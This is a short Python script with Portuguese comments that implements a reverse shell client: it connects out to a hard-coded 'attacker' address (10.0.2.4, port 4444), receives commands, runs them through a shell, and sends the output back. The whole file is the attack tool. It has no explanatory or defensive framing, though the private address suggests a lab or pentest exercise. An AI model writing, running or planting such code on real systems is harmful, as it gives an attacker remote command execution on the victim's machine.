# -*- coding: utf-8

import socket
import os
import subprocess

# Configuração do client, IP/PORTA do host server
IP_ATACANTE = '10.0.2.4'
PORTA = 4444

def cliente_reverse_shell():
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.connect((IP_ATACANTE, PORTA))

    while True:
        comando = cliente.recv(1024).decode('utf-8')

        if comando.lower() == 'exit':
            break

        if comando.startswith('cd'):
            caminho = comando[3:].strip()
            try:
                os.chdir(caminho)
                cliente.send(os.getcwd().encode('utf-8'))
            except:
                cliente.send('[-] Nao foi possivel encontrar o diretorio')
            continue

        processo = subprocess.Popen(comando, 
                                         shell=True, 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE, 
                                         stdin=subprocess.PIPE)
        saida, erro = processo.communicate()

        if not saida and not erro:
            cliente.send('[+] Comando executado com sucesso')
        else:
            cliente.send(saida + erro)

    cliente.close()

if __name__ == "__main__":
    cliente_reverse_shell()
